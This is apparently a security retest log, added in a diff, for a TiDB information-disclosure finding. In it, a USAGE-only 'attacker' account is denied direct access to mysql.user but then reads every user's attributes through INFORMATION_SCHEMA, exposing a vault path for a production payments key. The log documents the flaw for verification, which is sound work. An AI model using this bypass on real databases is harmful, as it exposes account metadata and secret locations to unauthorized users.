@@ -1,0 +1,15 @@
+=== TIDB-IS-USERATTR-01 E2E retest 2026-09-05T21:50:19-05:00 ===
+--- attacker grants (negative control premise: USAGE only) ---
+Grants for attacker@%
+GRANT USAGE ON *.* TO 'attacker'@'%'
+--- [negative control] direct mysql.user read DENIED ---
+SELECT user,host FROM mysql.user
+ERROR 1142 (42000) at line 1: SELECT command denied to user 'attacker'@'%' for table 'user'
+--- exploit: USER_ATTRIBUTES via IS bypass ---
+USER	HOST	ATTRIBUTE
+root	%	NULL
+svc_app	%	NULL
+payments_svc	%	{"owner": "finance-oncall", "vault_ref": "kv/prod/payments/api-key"}
+attacker	%	NULL
+app	%	NULL
+worker	%	NULL
